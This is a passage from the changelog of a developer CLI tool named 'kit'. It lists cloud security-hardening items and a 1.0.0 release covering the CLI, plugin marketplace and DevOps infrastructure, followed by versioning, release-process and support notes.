  - SG descriptions, ECR `IMMUTABLE`, CW log KMS + 365d retention, S3 abort-multipart, EKS supported version 1.31, EKS Secrets envelope encryption, KMS key policies, VPC flow logs, default-SG lockdown, ELBv2 access logs, RDS Performance Insights KMS (per region), NLB log bucket hardening, public-subnet auto-IP off, EKS private-endpoint default, RDS replica deletion-protection + enhanced monitoring, SNS KMS, RDS IAM auth, Lambda X-Ray + DLQ + KMS, EC2 IMDSv2 + EBS-opt, CloudFront response-headers policy, scoped Lambda IAM, RDS SSL-required, copy_tags_to_snapshot
- DAST stage scoped out: kit is CLI + MCP-over-stdio with no HTTP surface to scan
- Comprehensive security scanning across all pipeline stages (Phase 5E carry-over)
- OWASP Top 10 vulnerability assessment and remediation
- Container vulnerability scanning with Trivy (CRITICAL+HIGH gating)
- Infrastructure-as-code security scanning (Checkov + tfsec) with baseline file
- Rate limiting and DDoS protection
- Security headers validation

## [1.0.0] - 2026-04-15

### Added

- Phase 5C: DevOps & Deployment Infrastructure
  - Multi-stage Docker containers for CLI and marketplace
  - Kubernetes manifests with Kustomize overlays for dev/staging/prod
  - Terraform modules for complete infrastructure-as-code
  - GitHub Actions workflows for Docker builds and Kubernetes deployments
  - Horizontal Pod Autoscaling (HPA) with CPU/memory triggers
  - Pod Disruption Budget (PDB) for high availability
  - Service mesh integration (optional)
  - Monitoring stack (Prometheus + Grafana)
  - Logging aggregation (Fluent-bit + CloudWatch/ELK)
  - Certificate management with cert-manager
- Phase 4: Integration & Developer Experience
  - Sentry integration for error tracking
  - Datadog integration for APM and monitoring
  - Redis adapter for caching
  - CDN adapter for static asset acceleration
  - Testing framework enhancements
  - Error handling and recovery patterns
- Phase 3E: Author Dashboard
  - Backend implementation with 43 new tests
  - Frontend with 6 components and 4 pages
  - Community features foundation
- Phase 3: Marketplace
  - 4 core marketplace components (marketplace, storefront, listings, reviews)
  - 716 comprehensive tests
  - Plugin review and rating system
  - Search and filtering capabilities
  - User profiles and favorites
- Phase 2: Plugin Ecosystem
  - 10 ecosystem components (registry, resolver, security validator, etc.)
  - Plugin manifests and versioning
  - Dependency resolution
  - Security scanning
  - Plugin marketplace integration
- Phase 1: Core CLI
  - kit command-line interface
  - Tool management (mise-en-place integration)
  - Secret management (1Password integration)
  - Project setup and initialization
  - Configuration management (.kit.toml)

### Security

- Implemented comprehensive security framework (OWASP Top 10)
- Added dependency vulnerability scanning
- Enabled container image scanning
- Infrastructure security hardening
- GDPR and data protection compliance

---

## Release History Summary

| Version | Date        | Phase | Highlights                         |
| ------- | ----------- | ----- | ---------------------------------- |
| 1.0.0   | 2026-04-15  | 5C    | DevOps & Deployment Infrastructure |
| -       | In Progress | 5F    | Public Launch & Community          |

## Semantic Versioning

### Version Format: MAJOR.MINOR.PATCH

- **MAJOR** — Breaking changes (incompatible API changes)
- **MINOR** — New features (backward compatible)
- **PATCH** — Bug fixes (backward compatible)

### Examples

- 1.0.0 → 1.1.0: New feature added
- 1.0.0 → 1.0.1: Bug fix
- 1.0.0 → 2.0.0: Breaking change

## Release Process

### Before Each Release

1. Update CHANGELOG.md with changes since last release
2. Update version number in package.json
3. Create git tag: `git tag -a v1.0.0 -m "Release 1.0.0"`
4. Push tag: `git push origin v1.0.0`
5. GitHub Actions automatically builds and publishes

### Release Naming

- **Alpha (α)** — Early development, breaking changes expected
  - Example: v1.0.0-alpha.1
  - Testing by developers only
- **Beta (β)** — Feature-complete, bug fixes and polish
  - Example: v1.0.0-beta.1
  - Limited community testing
- **Release Candidate (RC)** — Preparation for release
  - Example: v1.0.0-rc.1
  - Final testing before release
- **Stable (Release)** — Production-ready
  - Example: v1.0.0
  - Recommended for production use

## Long-Term Support (LTS)

- **Current stable:** v1.x.x (released 2026-04-15)
- **Support period:** Until next major version (typically 12+ months)
- **Security updates:** Available throughout support period

## Migration Guides

- [Upgrading from Phase 4 to Phase 5](docs/MIGRATION_GUIDE.md)
- [Breaking Changes in v2.0.0](docs/API_STABILITY_AND_VERSIONING.md) (future)

## Contributors

Special thanks to all contributors who have helped shape kit:

- [View Contributors](https://github.com/sandstream/kit/graphs/contributors)

## Reporting Issues

Found a bug? Have a feature request? Please see our [CONTRIBUTING.md](CONTRIBUTING.md) guide.

---

**Note:** This changelog is maintained manually and should be updated with each release. Unreleased changes are accumulated and released with the next version.
